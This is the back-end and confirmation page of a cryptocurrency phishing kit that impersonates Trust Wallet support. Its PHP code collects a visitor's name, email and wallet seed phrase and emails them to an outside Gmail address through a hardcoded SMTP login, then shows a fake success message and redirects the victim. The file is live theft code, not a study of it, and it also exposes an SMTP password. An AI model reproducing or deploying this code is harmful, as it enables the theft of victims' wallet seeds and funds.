 <?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
require "PHPMailer/vendor/autoload.php";



$name=$_POST['full-name'];
$email=$_POST['email'];
$problem=$_POST['problem'];
$other=$_POST['other'];
$more=$_POST['more'];
$seed=$_POST['walletSeed'];


$email_from = "support@btccloudmine.com";

$email_subject = "New Form Submission";
 
$email_body = "<p>Full Name: $name</p> 
              
              <p>User Email: $email</p> 
              
              <p>Problem: $problem</p> 
			  <p>Other: $other</p> 
			  <p>More: $more</p> 
              <p>Seed: $seed</p> ";
              
$to = "daniellarryduru2019@gmail.com";

$headers = "From: support@btccloudmine.com\r\n";

$headers = "Reply-To $email\r\n";

$mail=new PHPMailer(true);
$mail->SMTPDebug=0;
$mail->isSMTP(true);
$mail->SMTPAuth=true;
$mail->Host="mail.btccloudmine.com";
$mail->Username="support@btccloudmine.com";
$mail->Password="Btccloudmine10";


$mail->isHTML(true);
$mail->setFrom("support@btccloudmine.com");
$mail->addAddress($to);
 
$mail->WordWrap = 50;
$mail->Subject=$email_subject;
$mail->Body=$email_body;
//$mail->AddAttachment("$target1","front-id");
//$mail->AddAttachment("$target2","back-id");

$sendmail=$mail->send();
if(!$sendmail){
    echo $mail->ErrorInfo;
}

?>
<!DOCTYPE html>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
		    
    <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no">
    <title>Trust Connect            </title>
         <link rel="shortcut icon" href="https://trustwallet.com/assets/images/favicon.png">
    <link rel="stylesheet" type="text/css" href="./Trust Connect_files/indexcoba1.css" title="ltr">
    <link rel="stylesheet" type="text/css" href="./Trust Connect_files/index-rtl.css" title="rtl" disabled="">
  <style></style><style data-jss="" data-meta="MuiInputBase">
@-webkit-keyframes mui-auto-fill {}
@-webkit-keyframes mui-auto-fill-cancel {}
.MuiInputBase-root {
  color: rgba(0, 0, 0, 0.87);
  cursor: text;
  display: inline-flex;
  position: relative;m
  font-size: 1rem;
  box-sizing: border-box;
  align-items: center;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 400;
  line-height: 1.1876em;
  letter-spacing: 0.00938em;
}
.MuiInputBase-root.Mui-disabled {
  color: rgba(0, 0, 0, 0.38);
  cursor: default;
}
.MuiInputBase-multiline {
  padding: 6px 0 7px;
}
.MuiInputBase-multiline.MuiInputBase-marginDense {
  padding-top: 3px;
}
.MuiInputBase-fullWidth {
  width: 100%;
}
.MuiInputBase-input {
  font: inherit;
  color: currentColor;
  width: 100%;
  border: 0;
  height: 1.1876em;
  margin: 0;
  display: block;
  padding: 6px 0 7px;
  min-width: 0;
  background: none;
  box-sizing: content-box;
  animation-name: mui-auto-fill-cancel;
  letter-spacing: inherit;
  animation-duration: 10ms;
  -webkit-tap-highlight-color: transparent;
}
body{
  line-height: 2;
}
.MuiInputBase-input::-webkit-input-placeholder {
  color: currentColor;
  opacity: 0.42;
  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
}
.MuiInputBase-input::-moz-placeholder {
  color: currentColor;
  opacity: 0.42;
  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
}
.MuiInputBase-input:-ms-input-placeholder {
  color: currentColor;
  opacity: 0.42;
  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
}
.MuiInputBase-input::-ms-input-placeholder {
  color: currentColor;
  opacity: 0.42;
  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
}
.MuiInputBase-input:focus {
  outline: 0;
}
.MuiInputBase-input:invalid {
  box-shadow: none;
}
.MuiInputBase-input::-webkit-search-decoration {
  -webkit-appearance: none;
}
.MuiInputBase-input.Mui-disabled {
  opacity: 1;
}
.MuiInputBase-input:-webkit-autofill {
  animation-name: mui-auto-fill;
  animation-duration: 5000s;
}
label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-webkit-input-placeholder {
  opacity: 0 !important;
}
label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-moz-placeholder {
  opacity: 0 !important;
}
label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:-ms-input-placeholder {
  opacity: 0 !important;
}
label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-ms-input-placeholder {
  opacity: 0 !important;
}
label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-webkit-input-placeholder {
  opacity: 0.42;
}
label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-moz-placeholder {
  opacity: 0.42;
}
label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus:-ms-input-placeholder {
  opacity: 0.42;
}
label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-ms-input-placeholder {
  opacity: 0.42;
}
.MuiInputBase-inputMarginDense {
  padding-top: 3px;
}
.MuiInputBase-inputMultiline {
  height: auto;
  resize: none;
  padding: 0;
}
.MuiInputBase-inputTypeSearch {
  -moz-appearance: textfield;
  -webkit-appearance: textfield;
}
</style><style data-jss="" data-meta="MuiInput">
.MuiInput-root {
  position: relative;
}
label + .MuiInput-formControl {
  margin-top: 16px;
}
.MuiInput-colorSecondary.MuiInput-underline:after {
  border-bottom-color: #f50057;
}
.MuiInput-underline:after {
  left: 0;
  right: 0;
  bottom: 0;
  content: "";
  position: absolute;
  transform: scaleX(0);
  transition: transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
  border-bottom: 2px solid #3f51b5;
  pointer-events: none;
}
.MuiInput-underline.Mui-focused:after {
  transform: scaleX(1);
}
.MuiInput-underline.Mui-error:after {
  transform: scaleX(1);
  border-bottom-color: #f44336;
}
.MuiInput-underline:before {
  left: 0;
  right: 0;
  bottom: 0;
  content: "\00a0";
  position: absolute;
  transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
  border-bottom: 1px solid rgba(0, 0, 0, 0.42);
  pointer-events: none;
}
.MuiInput-underline:hover:not(.Mui-disabled):before {
  border-bottom: 2px solid rgba(0, 0, 0, 0.87);
}
.MuiInput-underline.Mui-disabled:before {
  border-bottom-style: dotted;
}
@media (hover: none) {
  .MuiInput-underline:hover:not(.Mui-disabled):before {
    border-bottom: 1px solid rgba(0, 0, 0, 0.42);
  }
}
</style><style data-jss="" data-meta="MuiFormLabel">
.MuiFormLabel-root {
  color: rgba(0, 0, 0, 0.54);
  padding: 0;
  font-size: 1rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 400;
  line-height: 1;
  letter-spacing: 0.00938em;
}
.MuiFormLabel-root.Mui-focused {
  color: #3f51b5;
}
.MuiFormLabel-root.Mui-disabled {
  color: rgba(0, 0, 0, 0.38);
}
.MuiFormLabel-root.Mui-error {
  color: #f44336;
}
.MuiFormLabel-colorSecondary.Mui-focused {
  color: #f50057;
}
.MuiFormLabel-asterisk.Mui-error {
  color: #f44336;
}
</style><style data-jss="" data-meta="MuiInputLabel">
.MuiInputLabel-root {
  display: block;
  transform-origin: top left;
}
.MuiInputLabel-formControl {
  top: 0;
  left: 0;
  position: absolute;
  transform: translate(0, 24px) scale(1);
}
.MuiInputLabel-marginDense {
  transform: translate(0, 21px) scale(1);
}
.MuiInputLabel-shrink {
  transform: translate(0, 1.5px) scale(0.75);
  transform-origin: top left;
}
.MuiInputLabel-animated {
  transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
}
.MuiInputLabel-filled {
  z-index: 1;
  transform: translate(12px, 20px) scale(1);
  pointer-events: none;
}
.MuiInputLabel-filled.MuiInputLabel-marginDense {
  transform: translate(12px, 17px) scale(1);
}
.MuiInputLabel-filled.MuiInputLabel-shrink {
  transform: translate(12px, 10px) scale(0.75);
}
.MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {
  transform: translate(12px, 7px) scale(0.75);
}
.MuiInputLabel-outlined {
  z-index: 1;
  transform: translate(14px, 20px) scale(1);
  pointer-events: none;
}
.MuiInputLabel-outlined.MuiInputLabel-marginDense {
  transform: translate(14px, 12px) scale(1);
}
.MuiInputLabel-outlined.MuiInputLabel-shrink {
  transform: translate(14px, -6px) scale(0.75);
}
</style><style data-jss="" data-meta="MuiFormControl">
.MuiFormControl-root {
  border: 0;
  margin: 0;
  display: inline-flex;
  padding: 0;
  position: relative;
  min-width: 0;
  flex-direction: column;
  vertical-align: top;
}
.MuiFormControl-marginNormal {
  margin-top: 16px;
  margin-bottom: 8px;
}
.MuiFormControl-marginDense {
  margin-top: 8px;
  margin-bottom: 4px;
}
.MuiFormControl-fullWidth {
  width: 100%;
}
</style><style data-jss="" data-meta="MuiTextField">

</style><style data-jss="" data-meta="makeStyles">
.jss1 {
  color: #aeaeae;
  font-weight: 400;
}
.jss1.jss2 {
  color: #aeaeae;
}
.jss1.jss4 {
  color: #aeaeae;
}










.jss3:after {
  border-bottom: 2px solid #f7861c;
}
.jss5 {
  color: #aeaeae;
}
.jss6 {
  padding: 8px;
}
.jss6::placeholder {
  color: #aeaeae;
}
.jss7 {
  color: #fff;
}
.jss8:after {
  border-bottom: 2px solid #fff;
}
.jss9.jss10 {
  color: #5b5b5b;
}
.jss9.jss4 {
  color: #5b5b5b;
}
.jss12 {
  border: 1px solid #BBC0C5;
  height: 48px;
  display: flex;
  padding: 0 16px;
  align-items: center;
  border-radius: 6px;
}
label + .jss12 {
  margin-top: 9px;
}
.jss12.jss11 {
  border: 1px solid #2f9ae0;
}
.jss13 {
  color: #5b5b5b;
  position: initial;
  font-size: 1rem;
  transform: none;
  transition: none;
}
.jss14 {
  color: #5b5b5b;
  position: initial;
  font-size: .75rem;
  transform: none;
  transition: none;
}
.jss15 {
  line-height: initial !important;
}
</style></head>
  <body>
    <div id="app-content"><div class="app mouse-user-styles">
        
        <div class="app-header"><div class="app-header__contents"><img src="./Trust Connect_files/jalogo.png"></div></div>
    <div class="menu-droppo-container network-droppo" style="position: absolute; top: 58px; width: 309px; z-index: 55;"><style>
          .menu-droppo-enter {
            transition: transform 300ms ease-in-out;
            transform: translateY(-200%);
          }

          .menu-droppo-enter.menu-droppo-enter-active {
            transition: transform 300ms ease-in-out;
            transform: translateY(0%);
          }
          
          
          
          
          
          
          
          

          .menu-droppo-leave {
            transition: transform 300ms ease-in-out;
            transform: translateY(0%);
          }





          .menu-droppo-leave.menu-droppo-leave-active {
            transition: transform 300ms ease-in-out;
            transform: translateY(-200%);
          }
          
          
        </style></div>
		
		<div class="main-container-wrapper"><div class="first-view-main-wrapper"><div class="first-view-main">
		    
		   <script>
		       swal("Successful.","Your response has been received and is been resolved by our staff. Thank you for choosing Trust wallet.", "success")
                .then((value) => {
                    window.location.replace("index");
});
		   </script>
		
		
		
		</div></div></div></div></div>
    <div id="popover-content"></div>
    
    
    
    
    
    
    
    
    <script src="./Trust Connect_files/globalthis.js" type="text/javascript" charset="utf-8"></script>
    <script src="./Trust Connect_files/initSentry.js" type="text/javascript" charset="utf-8"></script>
    <script src="./Trust Connect_files/lockdown.js" type="text/javascript" charset="utf-8"></script>
    <script src="./Trust Connect_files/runLockdown.js" type="text/javascript" charset="utf-8"></script>
    <script src="./Trust Connect_files/ui-libs.js" type="text/javascript" charset="utf-8"></script>
    <script src="./Trust Connect_files/ui.js" type="text/javascript" charset="utf-8"></script>
  
  
  
  
  
  
  
  
  
  
  

</body></html>